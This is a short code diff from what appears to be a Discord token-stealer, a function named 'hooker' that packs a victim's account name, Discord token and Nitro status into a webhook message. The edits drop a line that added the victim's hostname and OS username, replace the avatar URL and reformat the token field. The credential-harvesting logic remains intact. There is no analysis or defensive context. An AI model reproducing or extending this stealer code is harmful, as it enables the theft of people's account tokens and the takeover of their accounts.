@@ -151,9 +151,8 @@ const request = async (method, url, headers, data) => {
 };
 
 const hooker = async (content, token, account) => {
-    content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
     content["username"] = "IM Project";
-    content["avatar_url"] = "https://i.ibb.co/kscWW4tH/le-poulet.png";
+    content["avatar_url"] = "https://avatars.githubusercontent.com/u/43183806?v=4";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
@@ -175,7 +174,7 @@ const hooker = async (content, token, account) => {
 
     content["embeds"][0]["fields"].push({
         "name": "Token",
-        "value": "```" + token + "```",
+        "value": "`" + token + "`",
         "inline": false
     }, {
         "name": "Nitro",
